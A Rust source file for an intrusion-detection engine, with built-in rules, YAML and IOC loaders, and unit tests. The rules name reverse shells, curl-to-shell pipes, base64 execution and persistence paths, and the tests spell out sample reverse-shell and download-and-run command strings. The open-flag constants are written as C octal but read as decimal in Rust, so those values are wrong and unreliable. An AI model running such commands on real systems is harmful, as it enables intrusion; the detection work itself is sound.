//! Detection engine: 14 built-in rules over the event stream,
//! plus optional sigma-style YAML rules and an IOC list.

use crate::events::Event;
use std::path::Path;

pub const O_WRONLY: u64 = 01;
pub const O_RDWR: u64 = 02;
pub const O_CREAT: u64 = 0100;
pub const O_TRUNC: u64 = 01000;
pub const O_APPEND: u64 = 010000;

pub fn is_write_open(flags: u64) -> bool {
    matches!(flags & 3, O_WRONLY | O_RDWR) || (flags & (O_CREAT | O_TRUNC | O_APPEND)) != 0
}

#[derive(Debug, Clone)]
pub struct Detection {
    pub rule: String,
    pub title: String,
    pub severity: &'static str,
    pub detail: String,
}

pub trait Matcher: Send + Sync {
    fn id(&self) -> &str;
    fn title(&self) -> &str;
    fn severity(&self) -> &'static str;
    fn match_ev(&self, e: &Event) -> Option<String>;
}

pub struct Builtin {
    pub id: &'static str,
    pub title: &'static str,
    pub severity: &'static str,
    pub f: fn(&Event) -> Option<String>,
}

impl Matcher for Builtin {
    fn id(&self) -> &str {
        self.id
    }
    fn title(&self) -> &str {
        self.title
    }
    fn severity(&self) -> &'static str {
        self.severity
    }
    fn match_ev(&self, e: &Event) -> Option<String> {
        (self.f)(e)
    }
}

// (contains_any helper kept for future yaml rules)

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

const KNOWN_PORTS: &[u32] = &[
    7, 9, 17, 19, 20, 21, 22, 25, 37, 43, 53, 67, 68, 69, 79, 80, 88, 110, 111, 123, 137, 138, 139,
    143, 161, 162, 177, 179, 389, 443, 465, 514, 515, 587, 631, 750, 873, 993, 995, 1080, 1194,
    1433, 1521, 1701, 1883, 1900, 2049, 3000, 3128, 3306, 3389, 3478, 3479, 4444, 5000, 5060, 5353,
    5355, 5432, 5672, 5900, 6379, 8000, 8080, 8443, 8888, 9000, 9050, 9051, 9090, 9093, 9200, 11211,
    15672, 27017, 25565,
];

fn shell_name(comm: &str) -> bool {
    matches!(basename(comm), "sh" | "bash" | "dash" | "zsh" | "ash")
        || matches!(comm, "sh" | "bash" | "dash" | "zsh")
}

pub fn builtins() -> Vec<Builtin> {
    vec![
        Builtin {
            id: "revshell-shell-i",
            title: "interactive shell process",
            severity: "medium",
            f: |e| {
                if e.kind == "exec" && shell_name(&e.comm) && e.args.split_whitespace().any(|a| a == "-i" || a == "-il" || a == "-li") {
                    Some(format!("{} {}", e.comm, e.args))
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "revshell-devtcp",
            title: "bash /dev/tcp reverse shell",
            severity: "high",
            f: |e| {
                if e.kind == "exec" && e.args.contains("/dev/tcp") {
                    Some(e.args.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "revshell-nc-exec",
            title: "netcat with -e program",
            severity: "high",
            f: |e| {
                if e.kind == "exec" && basename(&e.path).starts_with("nc") && (e.args.contains("-e") || e.args.contains("-c")) {
                    Some(e.args.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "download-pipe-shell",
            title: "curl/wget piped into a shell",
            severity: "high",
            f: |e| {
                if e.kind == "exec" && shell_name(&e.comm) && e.args.contains('|')
                    && (e.args.contains("curl") || e.args.contains("wget"))
                {
                    Some(e.args.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "base64-decode-exec",
            title: "base64 -d wired into execution",
            severity: "high",
            f: |e| {
                if e.kind == "exec" && e.args.contains("base64") && (e.args.contains("-d") || e.args.contains("--decode")) {
                    Some(e.args.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "persist-cron",
            title: "cron file write",
            severity: "medium",
            f: |e| {
                if e.kind == "open" && e.ret >= 0 && is_write_open(e.flags)
                    && (e.path.starts_with("/etc/cron") || e.path.starts_with("/var/spool/cron")
                        || e.path.starts_with("/run/cron"))
                {
                    Some(e.path.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "persist-systemd-unit",
            title: "systemd unit write",
            severity: "medium",
            f: |e| {
                if e.kind == "open" && e.ret >= 0 && is_write_open(e.flags)
                    && (e.path.starts_with("/etc/systemd/system/")
                        || e.path.starts_with("/usr/lib/systemd/system/")
                        || e.path.starts_with("/run/systemd/system/"))
                {
                    Some(e.path.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "persist-shellrc",
            title: "shell rc file write",
            severity: "medium",
            f: |e| {
                if e.kind == "open" && e.ret >= 0 && is_write_open(e.flags) {
                    let b = basename(&e.path);
                    if matches!(b, ".bashrc" | ".zshrc" | ".profile" | ".bash_profile" | ".zprofile") {
                        return Some(e.path.clone());
                    }
                }
                None
            },
        },
        Builtin {
            id: "priv-escalation",
            title: "uid changed to root",
            severity: "high",
            f: |e| {
                if e.kind == "cred" && e.uid == 0 && (e.ret as u32) != 0 {
                    Some(format!("uid {} -> 0 (euid {})", e.ret, e.flags))
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "unusual-outbound-port",
            title: "connect to an unusual port",
            severity: "medium",
            f: |e| {
                if e.kind == "connect" && e.ret >= 0 && !e.daddr.is_empty() && e.dport >= 1024
                    && !KNOWN_PORTS.contains(&e.dport)
                    // container runtime noise on loopback is not interesting
                    && !(e.daddr.starts_with("127.")
                        && matches!(e.comm.as_str(), "docker-proxy" | "containerd" | "conmon"))
                {
                    Some(format!("{}:{}", e.daddr, e.dport))
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "dns-long-name",
            title: "long DNS lookup name (tunnelling pattern)",
            severity: "medium",
            f: |e| {
                if e.kind == "exec" && matches!(basename(&e.path), "dig" | "host" | "nslookup" | "drill")
                    && e.args.split_whitespace().any(|t| t.len() >= 40 && t.contains('.'))
                {
                    Some(e.args.clone())
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "module-load",
            title: "kernel module loaded",
            severity: "info",
            f: |e| {
                if e.kind == "module" {
                    Some(format!("{} by uid {}", e.path, e.uid))
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "recon-tools",
            title: "recon tool executed",
            severity: "info",
            f: |e| {
                if e.kind == "exec"
                    && matches!(
                        basename(&e.path),
                        "ss" | "netstat" | "lsof" | "pstree" | "arp" | "id" | "uname"
                    )
                {
                    Some(format!("{} {}", e.path, e.args))
                } else {
                    None
                }
            },
        },
        Builtin {
            id: "exec-from-temp",
            title: "binary executed from temp dir",
            severity: "high",
            f: |e| {
                if e.kind == "exec"
                    && (e.path.starts_with("/tmp/") || e.path.starts_with("/dev/shm/")
                        || e.path.starts_with("/var/tmp/"))
                {
                    Some(e.path.clone())
                } else {
                    None
                }
            },
        },
    ]
}

pub struct Iocs {
    pub comms: Vec<String>,
    pub ips: Vec<String>,
    pub paths: Vec<String>,
}

impl Iocs {
    pub fn load(path: impl AsRef<std::path::Path>) -> std::io::Result<Iocs> {
        let text = std::fs::read_to_string(path)?;
        let mut o = Iocs { comms: vec![], ips: vec![], paths: vec![] };
        for line in text.lines() {
            let line = line.trim();
            if line.is_empty() || line.starts_with('#') {
                continue;
            }
            if let Some((kind, val)) = line.split_once(':') {
                match kind.trim() {
                    "comm" => o.comms.push(val.trim().to_string()),
                    "ip" => o.ips.push(val.trim().to_string()),
                    "path" => o.paths.push(val.trim().to_string()),
                    _ => o.paths.push(line.to_string()),
                }
            } else {
                o.paths.push(line.to_string());
            }
        }
        Ok(o)
    }
}

impl Matcher for Iocs {
    fn id(&self) -> &str {
        "ioc-match"
    }
    fn title(&self) -> &str {
        "IOC hit"
    }
    fn severity(&self) -> &'static str {
        "high"
    }
    fn match_ev(&self, e: &Event) -> Option<String> {
        if let Some(c) = self.comms.iter().find(|c| e.comm == **c || e.path == **c) {
            return Some(format!("comm/path {}", c));
        }
        if let Some(i) = self.ips.iter().find(|i| *i == &e.daddr && !e.daddr.is_empty()) {
            return Some(format!("daddr {}", i));
        }
        if let Some(p) = self.paths.iter().filter(|p| !p.is_empty()).find(|p| e.path.contains(&**p)) {
            return Some(format!("path {}", p));
        }
        None
    }
}

#[derive(serde::Deserialize)]
struct YamlRule {
    id: String,
    title: String,
    #[serde(default = "default_level")]
    level: String,
    selection: YamlSel,
}

fn default_level() -> String {
    "medium".to_string()
}

#[derive(serde::Deserialize, Default)]
struct YamlSel {
    #[serde(default)]
    kind: Option<String>,
    #[serde(default)]
    comm: Option<Vec<String>>,
    #[serde(default)]
    path_prefix: Option<Vec<String>>,
    #[serde(default)]
    args_contains: Option<Vec<String>>,
    #[serde(default)]
    dport: Option<Vec<u32>>,
    #[serde(default)]
    write_open: Option<bool>,
}

pub struct YamlMatcher {
    id: String,
    title: String,
    severity: &'static str,
    sel: YamlSel,
}

impl Matcher for YamlMatcher {
    fn id(&self) -> &str {
        &self.id
    }
    fn title(&self) -> &str {
        &self.title
    }
    fn severity(&self) -> &'static str {
        self.severity
    }
    fn match_ev(&self, e: &Event) -> Option<String> {
        let s = &self.sel;
        if let Some(k) = &s.kind {
            if k != &e.kind {
                return None;
            }
        }
        if let Some(c) = &s.comm {
            if !c.iter().any(|x| e.comm == *x || basename(&e.path) == *x) {
                return None;
            }
        }
        if let Some(p) = &s.path_prefix {
            if !p.iter().any(|x| e.path.starts_with(x)) {
                return None;
            }
        }
        if let Some(a) = &s.args_contains {
            if !a.iter().all(|x| e.args.contains(x)) {
                return None;
            }
        }
        if let Some(d) = &s.dport {
            if !d.contains(&e.dport) {
                return None;
            }
        }
        if s.write_open == Some(true) && !is_write_open(e.flags) {
            return None;
        }
        Some(format!("{} {}", e.kind, e.path))
    }
}

pub fn load_yaml_rules(dir: &Path) -> Vec<YamlMatcher> {
    let mut out = Vec::new();
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return out,
    };
    for entry in entries.flatten() {
        let p = entry.path();
        if p.extension().map(|x| x == "yml" || x == "yaml").unwrap_or(false) {
            if let Ok(text) = std::fs::read_to_string(&p) {
                match serde_yaml::from_str::<YamlRule>(&text) {
                    Ok(y) => {
                        let sev = match y.level.as_str() {
                            "informational" | "info" | "low" => "info",
                            "high" | "critical" => "high",
                            _ => "medium",
                        };
                        out.push(YamlMatcher { id: y.id, title: y.title, severity: sev, sel: y.selection });
                    }
                    Err(err) => eprintln!("skipping {}: {err}", p.display()),
                }
            }
        }
    }
    out
}

/// All rules (built-ins + yaml + ioc). Returns every matching detection.
pub fn run_rules(rules: &[Box<dyn Matcher>], e: &Event) -> Vec<Detection> {
    let mut out = Vec::new();
    for r in rules {
        if let Some(detail) = r.match_ev(e) {
            out.push(Detection {
                rule: r.id().to_string(),
                title: r.title().to_string(),
                severity: r.severity(),
                detail,
            });
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ev(kind: &str, comm: &str, path: &str, args: &str) -> Event {
        Event {
            ts: "t".into(), ktime_ns: 0, seq: 0, kind: String::from(kind).leak(),
            pid: 1, ppid: 1, uid: 1000,
            comm: comm.into(), path: path.into(), args: args.into(),
            daddr: String::new(), dport: 0, ret: 0, flags: 0,
        }
    }

    fn first(id: &str, e: Event) -> Option<Detection> {
        run_rules(&builtins().into_iter().map(|b| Box::new(b) as Box<dyn Matcher>).collect::<Vec<_>>(), &e)
            .into_iter()
            .find(|d| d.rule == id)
    }

    #[test]
    fn builtin_count() {
        assert!(builtins().len() >= 12);
    }

    #[test]
    fn revshell_and_download() {
        assert!(first("revshell-shell-i", ev("exec", "bash", "/usr/bin/bash", "-i")).is_some());
        assert!(first("revshell-shell-i", ev("exec", "bash", "/usr/bin/bash", "-c ls")).is_none());
        assert!(first("revshell-devtcp", ev("exec", "bash", "/bin/bash", "/dev/tcp/9.9.9.9/4444 -i")).is_some());
        assert!(first("revshell-nc-exec", ev("exec", "nc", "/usr/bin/nc", "-e /bin/sh 9.9.9.9 4444")).is_some());
        assert!(first("download-pipe-shell", ev("exec", "sh", "/bin/sh", "-c curl -s x | sh")).is_some());
        assert!(first("download-pipe-shell", ev("exec", "sh", "/bin/sh", "-c curl -o f x")).is_none());
        assert!(first("base64-decode-exec", ev("exec", "sh", "/bin/sh", "-c echo AAA | base64 -d | sh")).is_some());
    }

    #[test]
    fn persistence_paths() {
        let mut e = ev("open", "tee", "/etc/cron.d/backdoor", "");
        e.flags = O_WRONLY | O_CREAT | O_TRUNC;
        assert!(first("persist-cron", e.clone()).is_some());
        e.path = "/etc/systemd/system/x.service".into();
        assert!(first("persist-systemd-unit", e.clone()).is_some());
        e.path = "/home/u/.bashrc".into();
        assert!(first("persist-shellrc", e.clone()).is_some());
        e.path = "/etc/crontab".into();
        e.flags = 0; // read open -> no alert
        assert!(first("persist-cron", e.clone()).is_none());
    }

    #[test]
    fn net_cred_mod_temp() {
        let mut e = ev("connect", "curl", "", "");
        e.daddr = "93.184.216.34".into();
        e.dport = 8444;
        e.ret = 3;
        assert!(first("unusual-outbound-port", e.clone()).is_some());
        e.dport = 443;
        assert!(first("unusual-outbound-port", e.clone()).is_none());
        e.daddr = "127.0.0.1".into();
        e.dport = 9999;
        assert!(first("unusual-outbound-port", e.clone()).is_some()); // loopback still counts...
        e.comm = "docker-proxy".into();
        assert!(first("unusual-outbound-port", e.clone()).is_none()); // ...but not container noise

        let mut c = ev("cred", "su", "", "");
        c.uid = 0;
        c.ret = 1000;
        assert!(first("priv-escalation", c.clone()).is_some());
        c.ret = 0;
        assert!(first("priv-escalation", c).is_none());

        let m = ev("module", "insmod", "ext4", "");
        assert!(first("module-load", m).is_some());

        let t = ev("exec", "payload", "/tmp/payload", "");
        assert!(first("exec-from-temp", t).is_some());
        let t2 = ev("exec", "ls", "/usr/bin/ls", "");
        assert!(first("exec-from-temp", t2).is_none());
    }

    #[test]
    fn yaml_rules_load_and_match() {
        let dir = std::env::temp_dir().join(format!("bpsyml-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("meterpreter.yml"),
            r#"
id: yaml-test-meterpreter
title: connect to metasploit default port
level: high
selection:
  kind: connect
  dport: [4444]
"#,
        )
        .unwrap();
        std::fs::write(dir.join("broken.yml"), "id: [1,2,3").unwrap();
        let rules = load_yaml_rules(&dir);
        assert_eq!(rules.len(), 1, "broken rule skipped");
        let boxed: Vec<Box<dyn Matcher>> = rules.into_iter().map(|r| Box::new(r) as Box<dyn Matcher>).collect();
        let mut e = ev("connect", "handler", "", "");
        e.dport = 4444;
        let hits = run_rules(&boxed, &e);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].severity, "high");
        e.dport = 80;
        assert!(run_rules(&boxed, &e).is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn yaml_selection_combo() {
        let dir = std::env::temp_dir().join(format!("bpsyml2-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::write(
            dir.join("combo.yml"),
            r#"
id: yaml-combo
title: sh writing cron
selection:
  kind: open
  comm: [bash]
  path_prefix: ["/etc/cron"]
  write_open: true
"#,
        )
        .unwrap();
        let rules = load_yaml_rules(&dir);
        let boxed: Vec<Box<dyn Matcher>> = rules.into_iter().map(|r| Box::new(r) as Box<dyn Matcher>).collect();
        let mut e = ev("open", "bash", "/etc/cron.d/backdoor", "");
        e.flags = O_WRONLY | O_CREAT;
        assert_eq!(run_rules(&boxed, &e).len(), 1);
        e.path = "/home/u/x".into();
        assert!(run_rules(&boxed, &e).is_empty());
        e.path = "/etc/cron.d/x".into();
        e.flags = 0;
        assert!(run_rules(&boxed, &e).is_empty());
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn ioc_path_and_ip_match() {
        let iocs = Iocs {
            comms: vec![],
            ips: vec!["203.0.113.7".into()],
            paths: vec!["/tmp/payload".into()],
        };
        let boxed: Vec<Box<dyn Matcher>> = vec![Box::new(iocs)];
        let mut e = ev("connect", "x", "", "");
        e.daddr = "203.0.113.7".into();
        assert_eq!(run_rules(&boxed, &e).len(), 1);
        let e2 = ev("exec", "p", "/tmp/payload", "");
        assert_eq!(run_rules(&boxed, &e2).len(), 1);
        let e3 = ev("exec", "ls", "/usr/bin/ls", "");
        assert!(run_rules(&boxed, &e3).is_empty());
    }

    #[test]
    fn ioc_file_parses_kinds() {
        let path = std::env::temp_dir().join(format!("bpsioc-{}", std::process::id()));
        std::fs::write(&path, "# comment\ncomm:xsh\nip:198.51.100.2\npath:/tmp/payload\n\n").unwrap();
        let iocs = Iocs::load(&path).unwrap();
        assert_eq!(iocs.comms, vec!["xsh"]);
        assert_eq!(iocs.ips, vec!["198.51.100.2"]);
        assert_eq!(iocs.paths, vec!["/tmp/payload"]);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn write_open_matrix() {
        assert!(is_write_open(O_WRONLY));
        assert!(is_write_open(O_RDWR));
        assert!(is_write_open(O_WRONLY | O_CREAT | O_TRUNC));
        assert!(is_write_open(O_WRONLY | O_APPEND));
        assert!(!is_write_open(0));
        assert!(!is_write_open(1 << 30)); // random non-access bit set
    }

    #[test]
    fn dns_recon_ioc() {
        let d = ev("exec", "dig", "/usr/bin/dig", "0123456789abcdef0123456789abcdef.tunnel.example");
        assert!(first("dns-long-name", d).is_some());
        let d2 = ev("exec", "dig", "/usr/bin/dig", "example.com");
        assert!(first("dns-long-name", d2).is_none());
        let r = ev("exec", "ss", "/usr/bin/ss", "-tuln");
        assert!(first("recon-tools", r).is_some());

        let iocs = Iocs { comms: vec!["xsh".into()], ips: vec![], paths: vec![] };
        let e = ev("exec", "xsh", "/usr/bin/xsh", "");
        let hits = run_rules(&[Box::new(iocs) as Box<dyn Matcher>], &e);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].rule, "ioc-match");
    }
}
